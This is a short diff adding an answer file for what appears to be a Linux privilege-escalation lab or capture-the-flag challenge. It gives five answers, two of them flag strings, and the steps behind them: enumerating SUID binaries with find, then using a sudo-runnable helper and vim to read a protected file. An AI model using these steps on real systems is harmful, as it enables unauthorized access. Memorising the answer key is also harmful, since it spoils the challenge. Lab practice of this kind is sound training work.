@@ -1,0 +1,16 @@
+Qn 1 => 11
+
+Steps:
+1. find / -perm /4000 | wc -l
+
+Qn 2 => /home/tester/runcommand
+Qn 3 => Sud0_a5_A_uS3r
+
+Steps:
+1. sudo -u tester /home/tester/runcommand
+
+Qn 4 => /usr/bin/vim
+Qn 5 => pR1viL3ge_EscAL@ti0n_1s_3azY
+
+Steps:
+1. sudo -u tester /home/tester/runcommand vim secret.txt
